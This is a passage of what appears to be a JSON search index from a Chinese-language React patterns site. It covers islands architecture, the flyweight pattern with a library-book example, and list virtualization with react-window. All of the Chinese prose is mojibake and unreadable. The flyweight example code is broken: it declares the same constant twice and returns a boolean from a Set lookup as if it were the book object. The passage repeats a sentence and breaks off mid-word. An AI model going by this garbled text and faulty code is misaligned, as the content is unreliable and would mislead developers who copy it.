height=\u0026#34;32\u0026#34; onclick={add}\u0026gt;\u0026lt;/img\u0026gt; \u0026lt;img src=\u0026#34;/unlike.png\u0026#34; width=\u0026#34;32\u0026#34; height=\u0026#34;32\u0026#34; onclick={subtract}\u0026gt;\u0026lt;/img\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/\u0026gt; ); }   è¯¥ç»„ä»¶åœ¨è¿è¡Œæ—¶åµŒå…¥åˆ°é¡µé¢ä¸­ï¼Œå¹¶åœ¨å®¢æˆ·ç«¯æ°´åˆï¼Œä»¥ä¾¿å•å‡»äº‹ä»¶æŒ‰éœ€è¦è¿è¡Œã€‚\nAstro å…è®¸ HTMLã€CSS å’Œè„šæœ¬ä¹‹é—´çš„æ¸…æ™°åˆ†ç¦»ï¼Œå¹¶é¼“åŠ±åŸºäºç»„ä»¶çš„è®¾è®¡ã€‚ ä½¿ç”¨æ­¤æ¡†æ¶å¯ä»¥è½»æ¾å®‰è£…å’Œå¼€å§‹æ„å»ºç½‘ç«™ã€‚\n\rä¼˜ç¼ºç‚¹ Islands æ¶æ„ç»“åˆäº†æ¥è‡ªä¸åŒæ¸²æŸ“æŠ€æœ¯çš„æƒ³æ³•ï¼Œä¾‹å¦‚æœåŠ¡å™¨ç«¯æ¸²æŸ“ã€é™æ€ç«™ç‚¹ç”Ÿæˆå’Œéƒ¨åˆ†æ°´åŒ–ã€‚ å®æ–½å­¤å²›çš„ä¸€äº›æ½œåœ¨å¥½å¤„å¦‚ä¸‹ã€‚\n æ€§èƒ½ï¼š  å‡å°‘ä¼ é€åˆ°å®¢æˆ·ç«¯çš„ JavaScript ä»£ç é‡ã€‚ å‘é€çš„ä»£ç ä»…åŒ…å«äº¤äº’ç»„ä»¶æ‰€éœ€çš„è„šæœ¬ï¼Œè¿œå°‘äºé‡æ–°åˆ›å»ºæ•´ä¸ªé¡µé¢çš„è™šæ‹Ÿ DOM å’Œé‡æ–°æ°´åŒ–é¡µé¢ä¸Šæ‰€æœ‰å…ƒç´ æ‰€éœ€çš„è„šæœ¬ã€‚ JavaScript çš„è¾ƒå°å°ºå¯¸è‡ªåŠ¨å¯¹åº”äºæ›´å¿«çš„é¡µé¢åŠ è½½å’Œå¯äº¤äº’æ—¶é—´ (TTI)ã€‚\n  Astro ä¸ä¸º Next.js å’Œ Nuxt.js åˆ›å»ºçš„æ–‡æ¡£ç½‘ç«™çš„æ¯”è¾ƒæ˜¾ç¤º JavaScript ä»£ç å‡å°‘äº† 83%ã€‚ å…¶ä»–ç”¨æˆ·ä¹ŸæŠ¥å‘Šäº† Astro çš„æ€§èƒ½æ”¹è¿›ã€‚\n  SEOï¼šç”±äºæ‰€æœ‰é™æ€å†…å®¹éƒ½åœ¨æœåŠ¡å™¨ä¸Šå‘ˆç°ï¼› é¡µé¢æ˜¯ SEO å‹å¥½çš„ã€‚\n  ä¼˜å…ˆè€ƒè™‘é‡è¦å†…å®¹ï¼šç”¨æˆ·å‡ ä¹å¯ä»¥ç«‹å³è·å¾—å…³é”®å†…å®¹ï¼ˆå°¤å…¶æ˜¯åšå®¢ã€æ–°é—»æ–‡ç« å’Œäº§å“é¡µé¢ï¼‰ã€‚ åœ¨æ¶ˆè´¹å…³é”®å†…å®¹é€æ¸å¯ç”¨åï¼Œé€šå¸¸éœ€è¦ç”¨äºäº¤äº’çš„è¾…åŠ©åŠŸèƒ½ã€‚\n  å¯è®¿é—®æ€§ï¼šä½¿ç”¨æ ‡å‡†é™æ€ HTML é“¾æ¥è®¿é—®å…¶ä»–é¡µé¢æœ‰åŠ©äºæé«˜ç½‘ç«™çš„å¯è®¿é—®æ€§ã€‚\n  åŸºäºç»„ä»¶ï¼šè¯¥æ¶æ„æä¾›äº†åŸºäºç»„ä»¶æ¶æ„çš„æ‰€æœ‰ä¼˜ç‚¹ï¼Œä¾‹å¦‚å¯é‡ç”¨æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚\n  å°½ç®¡æœ‰è¿™äº›ä¼˜åŠ¿ï¼Œä½†è¯¥æ¦‚å¿µä»å¤„äºèµ·æ­¥é˜¶æ®µã€‚ æœ‰é™çš„æ”¯æŒå¯¼è‡´ä¸€äº›ç¼ºç‚¹ã€‚\n  å¼€å‘äººå‘˜å®ç° Islands çš„å”¯ä¸€é€‰æ‹©æ˜¯ä½¿ç”¨å°‘æ•°å¯ç”¨çš„æ¡†æ¶ä¹‹ä¸€æˆ–è‡ªå·±å¼€å‘æ¶æ„ã€‚ å°†ç°æœ‰ç«™ç‚¹è¿ç§»åˆ° Astro æˆ– Marko éœ€è¦é¢å¤–çš„åŠªåŠ›ã€‚\n  é™¤äº† Jason çš„åˆå§‹å¸–å­ï¼Œå‡ ä¹æ²¡æœ‰å…³äºè¿™ä¸ªæƒ³æ³•çš„è®¨è®ºã€‚\n  æ–°æ¡†æ¶å£°ç§°æ”¯æŒ Islands æ¶æ„ï¼Œå› æ­¤å¾ˆéš¾è¿‡æ»¤å‡ºé€‚åˆæ‚¨çš„æ¶æ„ã€‚\n  è¯¥æ¶æ„ä¸é€‚åˆé«˜åº¦äº¤äº’çš„é¡µé¢ï¼Œä¾‹å¦‚å¯èƒ½éœ€è¦æ•°åƒä¸ªå²›å±¿çš„ç¤¾äº¤åª’ä½“åº”ç”¨ç¨‹åºã€‚\n  Islands æ¶æ„æ¦‚å¿µç›¸å¯¹è¾ƒæ–°ï¼Œä½†ç”±äºå…¶æ€§èƒ½ä¼˜åŠ¿å¯èƒ½ä¼šåŠ å¿«é€Ÿåº¦ã€‚ å®ƒå¼ºè°ƒä½¿ç”¨ SSR æ¥å‘ˆç°é™æ€å†…å®¹ï¼ŒåŒæ—¶é€šè¿‡åŠ¨æ€ç»„ä»¶æ”¯æŒäº¤äº’æ€§ï¼ŒåŒæ—¶å¯¹é¡µé¢æ€§èƒ½çš„å½±å“æœ€å°ã€‚ æˆ‘ä»¬å¸Œæœ›æœªæ¥åœ¨è¿™ä¸ªé¢†åŸŸçœ‹åˆ°æ›´å¤šçš„å‚ä¸è€…ï¼Œå¹¶æœ‰æ›´å¤šçš„å®æ–½é€‰é¡¹å¯ä¾›é€‰æ‹©ã€‚\n\r\rçŸ¥è¯†ç‚¹    ","description":"å²›å±¿æ¶æ„é¼“åŠ±åœ¨æœåŠ¡å™¨æ¸²æŸ“çš„ç½‘é¡µä¸­è¿›è¡Œå°çš„ã€é›†ä¸­çš„äº¤äº’å—","id":129,"section":"react-patterns","tags":null,"title":"å²›å±¿æ¶æ„ âœ”","uri":"https://codthing.github.io/react-patterns/render-patterns/islands-architecture/"},{"content":"å½“åˆ›å»ºå¤§é‡ç›¸ä¼¼çš„å¯¹è±¡æ—¶ï¼Œäº«å…ƒæ¨¡å¼æ˜¯ä¸€ç§èŠ‚çœå†…å­˜çš„æœ‰ç”¨æ–¹æ³•ã€‚\n\rå›¾ä¹¦é¦†æ¡ˆä¾‹ åœ¨åº”ç”¨ç¨‹åºä¸­ï¼Œæˆ‘ä»¬å¸Œæœ›ç”¨æˆ·èƒ½å¤Ÿæ·»åŠ ä¹¦ç±ã€‚ æ‰€æœ‰çš„ä¹¦éƒ½æœ‰ä¹¦åã€ä½œè€…å’Œä¹¦å·ï¼ ä½†æ˜¯ï¼Œå›¾ä¹¦é¦†é€šå¸¸ä¸ä¼šåªæœ‰ä¸€æœ¬ä¹¦çš„å‰¯æœ¬ï¼šå®ƒé€šå¸¸æœ‰åŒä¸€æœ¬ä¹¦çš„å¤šä¸ªå‰¯æœ¬ã€‚\nå¦‚æœå®Œå…¨ç›¸åŒçš„ä¹¦æœ‰å¤šä¸ªå‰¯æœ¬ï¼Œåˆ™æ¯æ¬¡éƒ½åˆ›å»ºä¸€ä¸ªæ–°ä¹¦å®ä¾‹å¹¶ä¸æ˜¯å¾ˆæœ‰ç”¨ã€‚ ç›¸åï¼Œæˆ‘ä»¬æƒ³è¦åˆ›å»º Book æ„é€ å‡½æ•°çš„å¤šä¸ªå®ä¾‹ï¼Œä»£è¡¨ä¸€æœ¬ä¹¦ã€‚\nclass Book {\rconstructor(title, author, isbn) {\rthis.title = title;\rthis.author = author;\rthis.isbn = isbn;\r}\r} è®©æˆ‘ä»¬åˆ›å»ºå°†æ–°ä¹¦æ·»åŠ åˆ°åˆ—è¡¨ä¸­çš„åŠŸèƒ½ã€‚\nå¦‚æœä¸€æœ¬ä¹¦å…·æœ‰ç›¸åŒçš„ ISBN å·ï¼Œå› æ­¤æ˜¯å®Œå…¨ç›¸åŒçš„ä¹¦ç±ç±»å‹ï¼Œæˆ‘ä»¬ä¸æƒ³åˆ›å»ºä¸€ä¸ªå…¨æ–°çš„ Book å®ä¾‹ã€‚\nç›¸åï¼Œæˆ‘ä»¬åº”è¯¥é¦–å…ˆæ£€æŸ¥è¿™æœ¬ä¹¦æ˜¯å¦å·²ç»å­˜åœ¨ã€‚\n1 2 3 4 5 6 7 8 9 10  const isbnNumbers = new Set(); //å…è®¸å­˜å‚¨ä»»ä½•ç±»å‹çš„å”¯ä¸€å€¼ï¼Œæ— è®ºæ˜¯åŸå§‹å€¼æˆ–è€…æ˜¯å¯¹è±¡å¼•ç”¨  const createBook = (title, author, isbn) =\u0026gt; { const book = isbnNumbers.has(isbn); if (book) { return book; } };   å¦‚æœå®ƒè¿˜ä¸åŒ…å«ä¹¦çš„ ISBN å·ï¼Œæˆ‘ä»¬å°†åˆ›å»ºä¸€ä¸ªæ–°ä¹¦å¹¶å°†å…¶ ISBN å·æ·»åŠ åˆ° isbnNumbers é›†ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  const isbnNumbers = new Set(); const createBook = (title, author, isbn) =\u0026gt; { const book = isbnNumbers.has(isbn); if (book) { return book; } const book = new Book(title, author, isbn); isbnNumbers.add(isbn); return book; };   createBook å‡½æ•°å¸®åŠ©æˆ‘ä»¬åˆ›å»ºä¸€ç§ç±»å‹ä¹¦ç±çš„æ–°å®ä¾‹ã€‚ ä½†æ˜¯ï¼Œå›¾ä¹¦é¦†é€šå¸¸åŒ…å«åŒä¸€æœ¬ä¹¦çš„å¤šä¸ªå‰¯æœ¬ï¼\nåˆ›å»ºä¸€ä¸ª addBook å‡½æ•°ï¼Œå®ƒå…è®¸æ·»åŠ åŒä¸€æœ¬ä¹¦çš„å¤šä¸ªå‰¯æœ¬ã€‚ å®ƒåº”è¯¥è°ƒç”¨ createBook å‡½æ•°ï¼Œè¯¥å‡½æ•°è¿”å›ä¸€ä¸ªæ–°åˆ›å»ºçš„ Book å®ä¾‹ï¼Œæˆ–è€…è¿”å›å·²ç»å­˜åœ¨çš„å®ä¾‹ã€‚\nä¸ºäº†è·Ÿè¸ªå‰¯æœ¬æ€»æ•°ï¼Œè®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ª bookList æ•°ç»„ï¼Œå…¶ä¸­åŒ…å«å›¾ä¹¦é¦†ä¸­çš„å›¾ä¹¦æ€»æ•°ã€‚\nconst bookList = [];\rconst addBook = (title, author, isbn, availibility, sales) =\u0026gt; {\rconst book = {\r...createBook(title, author, isbn),\rsales,\ravailibility,\risbn\r};\rbookList.push(book);\rreturn book;\r}; Perfectï¼ ä¸æ˜¯æ¯æ¬¡æ·»åŠ å‰¯æœ¬æ—¶éƒ½åˆ›å»ºä¸€ä¸ªæ–°çš„ Book å®ä¾‹ï¼Œå¯ä»¥æœ‰æ•ˆåœ°å°†å·²ç»å­˜åœ¨çš„ Book å®ä¾‹ç”¨äºè¯¥ç‰¹å®šå‰¯æœ¬ã€‚\nè®©æˆ‘ä»¬åˆ¶ä½œ 3 æœ¬ä¹¦çš„ 5 ä»½å‰¯æœ¬ï¼šã€Šå“ˆåˆ©æ³¢ç‰¹ã€‹ã€ã€Šæ€æ­»ä¸€åªçŸ¥æ›´é¸Ÿã€‹å’Œã€Šäº†ä¸èµ·çš„ç›–èŒ¨æ¯”ã€‹ã€‚\naddBook(\u0026#34;Harry Potter\u0026#34;, \u0026#34;JK Rowling\u0026#34;, \u0026#34;AB123\u0026#34;, false, 100);\raddBook(\u0026#34;Harry Potter\u0026#34;, \u0026#34;JK Rowling\u0026#34;, \u0026#34;AB123\u0026#34;, true, 50);\raddBook(\u0026#34;To Kill a Mockingbird\u0026#34;, \u0026#34;Harper Lee\u0026#34;, \u0026#34;CD345\u0026#34;, true, 10);\raddBook(\u0026#34;To Kill a Mockingbird\u0026#34;, \u0026#34;Harper Lee\u0026#34;, \u0026#34;CD345\u0026#34;, false, 20);\raddBook(\u0026#34;The Great Gatsby\u0026#34;, \u0026#34;F. Scott Fitzgerald\u0026#34;, \u0026#34;EF567\u0026#34;, false, 20); è™½ç„¶æœ‰ 5 ä¸ªå‰¯æœ¬ï¼Œä½†æˆ‘ä»¬åªæœ‰ 3 ä¸ª Book å®ä¾‹ï¼\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  class Book { constructor(title, author, isbn) { this.title = title; this.author = author; this.isbn = isbn; } } const isbnNumbers = new Set(); const bookList = []; const addBook = (title, author, isbn, availibility, sales) =\u0026gt; { const book = { ...createBook(title, author, isbn), sales, availibility, isbn }; bookList.push(book); return book; }; const createBook = (title, author, isbn) =\u0026gt; { const book = isbnNumbers.has(isbn); if (book) { return book; } else { const book = new Book(title, author, isbn); isbnNumbers.add(isbn); return book; } }; addBook(\u0026#34;Harry Potter\u0026#34;, \u0026#34;JK Rowling\u0026#34;, \u0026#34;AB123\u0026#34;, false, 100); addBook(\u0026#34;Harry Potter\u0026#34;, \u0026#34;JK Rowling\u0026#34;, \u0026#34;AB123\u0026#34;, true, 50); addBook(\u0026#34;To Kill a Mockingbird\u0026#34;, \u0026#34;Harper Lee\u0026#34;, \u0026#34;CD345\u0026#34;, true, 10); addBook(\u0026#34;To Kill a Mockingbird\u0026#34;, \u0026#34;Harper Lee\u0026#34;, \u0026#34;CD345\u0026#34;, false, 20); addBook(\u0026#34;The Great Gatsby\u0026#34;, \u0026#34;F. Scott Fitzgerald\u0026#34;, \u0026#34;EF567\u0026#34;, false, 20); console.log(\u0026#34;Total amount of copies: \u0026#34;, bookList.length); // Total amount of copies: 5 console.log(\u0026#34;Total amount of books: \u0026#34;, isbnNumbers.size); // Total amount of books: 3   \rä¼˜ç‚¹ å½“æ‚¨åˆ›å»ºå¤§é‡å¯¹è±¡æ—¶ï¼Œè¿™å¯èƒ½ä¼šè€—å°½æ‰€æœ‰å¯ç”¨ RAMã€‚\näº«å…ƒæ¨¡å¼å¾ˆæœ‰ç”¨ï¼Œå®ƒä½¿æˆ‘ä»¬èƒ½å¤Ÿæœ€å¤§é™åº¦åœ°å‡å°‘æ¶ˆè€—çš„å†…å­˜é‡ã€‚\nå¦‚ä»Šï¼Œç¡¬ä»¶å…·æœ‰ GB çš„ RAMï¼Œè¿™ä½¿å¾—äº«å…ƒæ¨¡å¼å˜å¾—ä¸é‚£ä¹ˆé‡è¦ã€‚\nåœ¨ JavaScript ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŸå‹ç»§æ‰¿è½»æ¾è§£å†³è¿™ä¸ªé—®é¢˜ã€‚\n\rçŸ¥è¯†ç‚¹  Set() - Set å¯¹è±¡å…è®¸å­˜å‚¨ä»»ä½•ç±»å‹çš„å”¯ä¸€å€¼ï¼Œæ— è®ºæ˜¯åŸå§‹å€¼æˆ–è€…æ˜¯å¯¹è±¡å¼•ç”¨ã€‚  ","description":"å¤„ç†ç›¸åŒå¯¹è±¡æ—¶é‡ç”¨ç°æœ‰å®ä¾‹","id":130,"section":"react-patterns","tags":null,"title":"äº¨å…ƒæ¨¡å¼","uri":"https://codthing.github.io/react-patterns/design-patterns/flyweight-pattern/"},{"content":"åœ¨æœ¬æŒ‡å—ä¸­ï¼Œè®¨è®ºåˆ—è¡¨è™šæ‹ŸåŒ–ï¼ˆä¹Ÿç§°ä¸ºçª—å£åŒ–ï¼‰ã€‚\nè¿™æ˜¯åœ¨åŠ¨æ€åˆ—è¡¨ä¸­ä»…å‘ˆç°å¯è§å†…å®¹è¡Œè€Œä¸æ˜¯æ•´ä¸ªåˆ—è¡¨çš„æƒ³æ³•ã€‚\nå‘ˆç°çš„è¡Œåªæ˜¯å®Œæ•´åˆ—è¡¨çš„ä¸€å°éƒ¨åˆ†ï¼Œéšç€ç”¨æˆ·æ»šåŠ¨å¯è§ï¼ˆçª—å£ï¼‰ç§»åŠ¨ã€‚ è¿™å¯ä»¥æé«˜æ¸²æŸ“æ€§èƒ½ã€‚\nå¦‚æœä½¿ç”¨ React å¹¶ä¸”éœ€è¦é«˜æ•ˆåœ°æ˜¾ç¤ºå¤§é‡æ•°æ®åˆ—è¡¨ï¼Œ\næ‚¨å¯èƒ½ç†Ÿæ‚‰ react-virtualizedã€‚ å®ƒæ˜¯ Brian Vaughn çš„ä¸€ä¸ªçª—å£åº“ï¼Œå®ƒåªå‘ˆç°åˆ—è¡¨ä¸­å½“å‰å¯è§çš„é¡¹ç›®ï¼ˆåœ¨æ»šåŠ¨â€œè§†å£â€ä¸­ï¼‰ã€‚\nè¿™æ„å‘³ç€æ— éœ€æ”¯ä»˜ä¸€æ¬¡å‘ˆç°æ•°åƒè¡Œæ•°æ®çš„æˆæœ¬ã€‚ è¿™ç¯‡æ–‡ç« éšé™„äº†å¸¦æœ‰ react-window çš„åˆ—è¡¨è™šæ‹ŸåŒ–è§†é¢‘æ¼”ç»ƒã€‚\n\råˆ—è¡¨è™šæ‹ŸåŒ–å¦‚ä½•å·¥ä½œï¼Ÿ â€œè™šæ‹ŸåŒ–â€é¡¹ç›®åˆ—è¡¨æ¶‰åŠç»´æŠ¤ä¸€ä¸ªçª—å£å¹¶åœ¨åˆ—è¡¨ä¸­ç§»åŠ¨è¯¥çª—å£ã€‚\né€šè¿‡ä»¥ä¸‹æ–¹å¼åœ¨ååº”è™šæ‹ŸåŒ–å·¥ä½œä¸­å¼€çª—ï¼š\n  å…·æœ‰ç›¸å¯¹å®šä½ï¼ˆçª—å£ï¼‰çš„å°å‹å®¹å™¨ DOM å…ƒç´ ï¼ˆä¾‹å¦‚ \u0026lt;ul\u0026gt;ï¼‰\n  æœ‰ä¸€ä¸ªç”¨äºæ»šåŠ¨çš„å¤§ DOM å…ƒç´ \n  ç»å¯¹å°†å­©å­å®šä½åœ¨å®¹å™¨å†…ï¼Œè®¾ç½®ä»–ä»¬çš„é¡¶éƒ¨ã€å·¦ä¾§ã€å®½åº¦å’Œé«˜åº¦çš„æ ·å¼\n  è™šæ‹ŸåŒ–ä¸æ˜¯ä¸€æ¬¡æ¸²æŸ“åˆ—è¡¨ä¸­çš„ 1000 ä¸ªå…ƒç´ ï¼ˆè¿™ä¼šå¯¼è‡´åˆå§‹æ¸²æŸ“å˜æ…¢æˆ–å½±å“æ»šåŠ¨æ€§èƒ½ï¼‰ï¼Œ\nè€Œæ˜¯ä¸“æ³¨äºä»…æ¸²æŸ“ç”¨æˆ·å¯è§çš„é¡¹ç›®ã€‚\nè¿™æœ‰åŠ©äºåœ¨ä¸­ä½ç«¯è®¾å¤‡ä¸Šä¿æŒå¿«é€Ÿçš„åˆ—è¡¨æ¸²æŸ“ã€‚\nå¯ä»¥åœ¨ç”¨æˆ·æ»šåŠ¨æ—¶è·å–/æ˜¾ç¤ºæ›´å¤šé¡¹ç›®ï¼Œå¸è½½ä»¥å‰çš„æ¡ç›®å¹¶ç”¨æ–°æ¡ç›®æ›¿æ¢å®ƒä»¬ã€‚\n\rreact-virtualized çš„è¾ƒå°æ›¿ä»£æ–¹æ¡ˆ react-window æ˜¯åŒä¸€ä½œè€…å¯¹ react-virtualized çš„é‡å†™ï¼Œæ—¨åœ¨æ›´å°ã€æ›´å¿«å’Œæ›´æ˜“æ‘‡æ ‘ã€‚\nä½¿ç”¨å®ƒä»£æ›¿ react-virtualized å¯ä»¥èŠ‚çœå¤§çº¦ 20-30KBï¼ˆgzippedï¼‰ï¼š\nè¿™ä¸¤ä¸ªåŒ…çš„ API ç›¸ä¼¼ï¼Œä½†åœ¨ä¸åŒçš„åœ°æ–¹ï¼Œreact-window å¾€å¾€æ›´ç®€å•ã€‚\nreact-window çš„ç»„ä»¶åŒ…æ‹¬ï¼š\nList åˆ—è¡¨å‘ˆç°å…ƒç´ çš„çª—å£åˆ—è¡¨ï¼ˆè¡Œï¼‰ï¼Œè¿™æ„å‘³ç€ä»…å‘ç”¨æˆ·æ˜¾ç¤ºå¯è§è¡Œï¼ˆä¾‹å¦‚ FixedSizeListã€VariableSizeListï¼‰ã€‚\nåˆ—è¡¨ä½¿ç”¨ Gridï¼ˆå†…éƒ¨ï¼‰æ¥å‘ˆç°è¡Œï¼Œå°†é“å…·ä¸­ç»§åˆ°è¯¥å†…éƒ¨ç½‘æ ¼ã€‚\nä½¿ç”¨ React æ¸²æŸ“æ•°æ®åˆ—è¡¨\nè¿™æ˜¯ä½¿ç”¨ React æ¸²æŸ“ç®€å•æ•°æ®åˆ—è¡¨ (itemsArray) çš„ç¤ºä¾‹ï¼š\nimport React from \u0026#34;react\u0026#34;;\rimport ReactDOM from \u0026#34;react-dom\u0026#34;;\rconst itemsArray = [\r{ name: \u0026#34;Drake\u0026#34; },\r{ name: \u0026#34;Halsey\u0026#34; },\r{ name: \u0026#34;Camillo Cabello\u0026#34; },\r{ name: \u0026#34;Travis Scott\u0026#34; },\r{ name: \u0026#34;Bazzi\u0026#34; },\r{ name: \u0026#34;Flume\u0026#34; },\r{ name: \u0026#34;Nicki Minaj\u0026#34; },\r{ name: \u0026#34;Kodak Black\u0026#34; },\r{ name: \u0026#34;Tyga\u0026#34; },\r{ name: \u0026#34;Buno Mars\u0026#34; },\r{ name: \u0026#34;Lil Wayne\u0026#34; }, ...\r]; // our data\rconst Row = ({ index, style }) =\u0026gt; (\r\u0026lt;div className={index % 2 ? \u0026#34;ListItemOdd\u0026#34; : \u0026#34;ListItemEven\u0026#34;} style={style}\u0026gt;\r{itemsArray[index].name}\r\u0026lt;/div\u0026gt;\r);\rconst Example = () =\u0026gt; (\r\u0026lt;div\rstyle=\rclass=\u0026#34;List\u0026#34;\r\u0026gt;\r{itemsArray.map((item, index) =\u0026gt; Row({ index }))}\r\u0026lt;/div\u0026gt;\r);\rReactDOM.render(\u0026lt;Example /\u0026gt;, document.getElementById(\u0026#34;root\u0026#34;)); ä½¿ç”¨ react-window æ¸²æŸ“åˆ—è¡¨\n\u0026hellip;è¿™é‡Œæ˜¯ä½¿ç”¨ react-window çš„ FixedSizeList çš„ç›¸åŒç¤ºä¾‹ï¼Œå®ƒéœ€è¦ä¸€äº›é“å…·ï¼ˆwidthã€heightã€itemCountã€itemSizeï¼‰å’Œä½œä¸ºå­é¡¹ä¼ é€’çš„è¡Œæ¸²æŸ“å‡½æ•°ï¼š\nimport React from \u0026#34;react\u0026#34;;\rimport ReactDOM from \u0026#34;react-dom\u0026#34;;\rimport { FixedSizeList as List } from \u0026#34;react-window\u0026#34;;\rconst itemsArray = [...]; // our data\rconst Row = ({ index, style }) =\u0026gt; (\r\u0026lt;div className={index % 2 ? \u0026#34;ListItemOdd\u0026#34; : \u0026#34;ListItemEven\u0026#34;} style={style}\u0026gt;\r{itemsArray[index].name}\r\u0026lt;/div\u0026gt;\r);\rconst Example = () =\u0026gt; (\r\u0026lt;List\rclassName=\u0026#34;List\u0026#34;\rheight={150}\ritemCount={itemsArray.length}\ritemSize={35}\rwidth={300}\r\u0026gt;\r{Row}\r\u0026lt;/List\u0026gt;\r);\rReactDOM.render(\u0026lt;Example /\u0026gt;, document.getElementById(\u0026#34;root\u0026#34;)); Grid Grid ä½¿ç”¨è™šæ‹ŸåŒ–æ²¿å‚ç›´å’Œæ°´å¹³è½´å‘ˆç°è¡¨æ ¼æ•°æ®ï¼ˆä¾‹å¦‚ FizedSizeGridã€VariableSizeGidï¼‰ã€‚\nå®ƒä»…æ ¹æ®å½“å‰çš„æ°´å¹³/å‚ç›´æ»šåŠ¨ä½ç½®å‘ˆç°å¡«å……è‡ªèº«æ‰€éœ€çš„ Grid å•å…ƒæ ¼ã€‚\nå¦‚æœæƒ³ç”¨ Grid å¸ƒå±€å‘ˆç°ä¸ä¹‹å‰ç›¸åŒçš„åˆ—è¡¨ï¼Œå‡è®¾æˆ‘ä»¬çš„è¾“å…¥æ˜¯ä¸€ä¸ªå¤šç»´æ•°ç»„ï¼Œå¯ä»¥ä½¿ç”¨ FixedSizeGrid å®Œæˆæ­¤æ“ä½œï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\nimport React from \u0026#39;react\u0026#39;;\rimport ReactDOM from \u0026#39;react-dom\u0026#39;;\rimport { FixedSizeGrid as Grid } from \u0026#39;react-window\u0026#39;;\rconst itemsArray = [\r[{},{},{},...],\r[{},{},{},...],\r[{},{},{},...],\r[{},{},{},...],\r]; const Cell = ({ columnIndex, rowIndex, style }) =\u0026gt; (\r\u0026lt;div\rclassName={\rcolumnIndex % 2\r? rowIndex % 2 === 0\r? \u0026#39;GridItemOdd\u0026#39;\r: \u0026#39;GridItemEven\u0026#39;\r: rowIndex % 2\r? \u0026#39;GridItemOdd\u0026#39;\r: \u0026#39;GridItemEven\u0026#39;\r}\rstyle={style}\r\u0026gt;\r{itemsArray[rowIndex][columnIndex].name}\r\u0026lt;/div\u0026gt;\r);\rconst Example = () =\u0026gt; (\r\u0026lt;Grid\rclassName=\u0026#34;Grid\u0026#34;\rcolumnCount={5}\rcolumnWidth={100}\rheight={150}\rrowCount={5}\rrowHeight={35}\rwidth={300}\r\u0026gt;\r{Cell}\r\u0026lt;/Grid\u0026gt;\r);\rReactDOM.render(\u0026lt;Example /\u0026gt;, document.getElementById(\u0026#39;root\u0026#39;)); æ›´æ·±å…¥çš„ react-window ç¤ºä¾‹ Scott Taylor ä½¿ç”¨ react-window å’Œ FixedSizeGrid å®ç°äº†ä¸€ä¸ªå¼€æºçš„ Pitchfork éŸ³ä¹è¯„è®ºæŠ“å–å·¥å…· (src)ã€‚\nPitchfork scraper ä½¿ç”¨ react-window-infinite-loaderï¼Œå®ƒæœ‰åŠ©äºå°†å¤§å‹æ•°æ®é›†åˆ†è§£ä¸ºå¯ä»¥åœ¨æ»šåŠ¨åˆ°è§†å›¾ä¸­æ—¶åŠ è½½çš„å—ã€‚\nä»¥ä¸‹æ˜¯å¦‚ä½•å°† react-window-infinite-loader çº³å…¥æ­¤åº”ç”¨ç¨‹åºçš„ç‰‡æ®µï¼š\nimport React, { Component } from \u0026#39;react\u0026#39;;\rimport { FixedSizeGrid as Grid } from \u0026#39;react-window\u0026#39;;\rimport InfiniteLoader from \u0026#39;react-window-infinite-loader\u0026#39;;\r...\rrender() {\rreturn (\r\u0026lt;InfiniteLoader\risItemLoaded={this.isItemLoaded}\rloadMoreItems={this.loadMoreItems}\ritemCount={this.state.count + 1}\r\u0026gt;\r{({ onItemsRendered, ref }) =\u0026gt; (\r\u0026lt;Grid\ronItemsRendered={this.onItemsRendered(onItemsRendered)}\rcolumnCount={COLUMN_SIZE}\rcolumnWidth={180}\rheight={800}\rrowCount={Math.max(this.state.count / COLUMN_SIZE)}\rrowHeight={220}\rwidth={1024}\rref={ref}\r\u0026gt;\r{this.renderCell}\r\u0026lt;/Grid\u0026gt;\r)}\r\u0026lt;/InfiniteLoader\u0026gt;\r);\r}\r} æ‚¨å¯èƒ½ä¼šå‘ç°ä» react-virtualized ç§»æ¤åº”ç”¨ç¨‹åºçš„æäº¤å¾ˆæœ‰ç”¨ã€‚\nä½¿ç”¨ FixedSizeList çš„ Pitchfork æŠ“å–å™¨çš„å®ç°ä¹Ÿæ˜¯å¯ç”¨çš„ï¼ˆPixel ä¸Šçš„ demoï¼‰ï¼š\nè¿™æ˜¯å®ç°çš„ä¸€ä¸ªç‰‡æ®µï¼š\nreturn (\r\u0026lt;InfiniteLoader\risItemLoaded={this.isItemLoaded}\rloadMoreItems={this.loadMoreItems}\ritemCount={this.state.count}\r\u0026gt;\r{({ onItemsRendered, ref }) =\u0026gt; (\r\u0026lt;section\u0026gt;\r\u0026lt;FixedSizeList\ritemCount={this.state.count}\ritemSize={ROW_HEIGHT}\ronItemsRendered={onItemsRendered}\rheight={this.state.height}\rwidth={this.state.width}\rref={ref}\r\u0026gt;\r{this.renderCell}\r\u0026lt;/FixedSizeList\u0026gt;\r\u0026lt;/section\u0026gt;\r)}\r\u0026lt;/InfiniteLoader\u0026gt;\r); å¦‚æœæˆ‘ä»¬å¯¹ Grid è™šæ‹ŸåŒ–è§£å†³æ–¹æ¡ˆæœ‰æ›´å¤æ‚çš„éœ€æ±‚æ€ä¹ˆåŠï¼Ÿ\næˆ‘ä»¬å‘ç°äº†ä¸€ä¸ª The Movie Database æ¼”ç¤ºåº”ç”¨ç¨‹åºï¼Œå®ƒåœ¨åå°ä½¿ç”¨äº† react-virtualized å’Œ Infinite Loaderã€‚\nå°†å®ƒç§»æ¤åˆ° react-window å’Œ react-window-infinite-loader å¹¶æ²¡æœ‰èŠ±å¾ˆé•¿æ—¶é—´ï¼Œä½†æˆ‘ä»¬ç¡®å®å‘ç°ä¸€äº›ç»„ä»¶å°šä¸å—æ”¯æŒã€‚ æ— è®ºå¦‚ä½•ï¼Œæœ€ç»ˆçš„åŠŸèƒ½éå¸¸æ¥è¿‘ã€‚\nå°†å®ƒç§»æ¤åˆ° react-window å’Œ react-window-infinite-loader å¹¶æ²¡æœ‰èŠ±å¾ˆé•¿æ—¶é—´ï¼Œä½†æˆ‘ä»¬ç¡®å®å‘ç°ä¸€äº›ç»„ä»¶å°šä¸å—æ”¯æŒã€‚ æ— 